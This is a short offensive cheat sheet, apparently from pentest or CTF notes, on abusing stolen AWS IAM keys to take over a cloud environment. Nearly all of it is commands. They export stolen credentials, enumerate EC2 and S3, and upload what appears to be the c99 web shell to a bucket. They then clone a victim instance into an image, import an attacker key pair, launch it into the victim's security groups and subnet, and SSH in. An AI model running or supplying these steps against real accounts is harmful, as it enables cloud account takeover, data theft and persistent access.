**Obtaining IAM Key allow you to create any instance, create Security group anything you could do whatever you want.there are several vector to obtain a valid IAM Key to laverage to compromise the entire dedicated network.**

```
export AWS_DEFAULT_REGION=us-east-1
export AWS_ACCESS_KEY_ID=XXX
export AWS_SECRET_ACCESS_KEY=XXX
export AWS_SESSION_TOKEN=XXXX
```
# Basic Enumeration
```
aws ec2 describe-regions --output table
aws ec2 describe-addresses
aws ec2 describe-instance-status
aws ec2 describe-key-pairs
aws ec2 describe-instance-types
aws ec2 describe-network-acls
aws ec2 describe-security-groups
aws ec2 describe-snapshots

```



```
aws s3 ls  s3://ctfbucket-374385855887
aws s3 cp file.txt s3://ctfbucket-374385855887/test.txt
aws s3 cp c99.txt s3://ctfbucket-374385855887/c99.txt
http://s3.amazonaws.com/ctfbucket-374385855887
```


```
aws ec2 describe-instances
aws ec2 describe-instances --instance-ids i-01dae4002316c79e6
aws ec2 create-image --instance-id i-01dae4002316c79e6 --name "XXXX" --description "XXXX"
aws ec2 import-key-pair --key-name "XXXX" --public-key-material file://aws.pub
aws ec2 run-instances --image-id ami-069f61c4801753ffc --security-group-ids "sg-a5b42392" "sg-0ed973a145df7fa29" "sg-07144a98dc383a311" --count 1 --instance-type t2.micro --key-name  --query "Instances[0].InstanceId"
aws ec2 run-instances --image-id ami-069f61c4801753ffc --security-group-ids "sg-a5b42392" "sg-0ed973a145df7fa29" "sg-07144a98dc383a311" --subnet-id subnet-7aefab74 --count 1 --instance-type t2.micro --key-name Deloitte --query "Instances[0].InstanceId"
aws ec2 describe-instances --instance-ids i-01dae4002316c79e6 --query "Reservations[0].Instances[0].PublicIpAddress"
ssh -i aws_terraform ubuntu@3.238.62.143
```
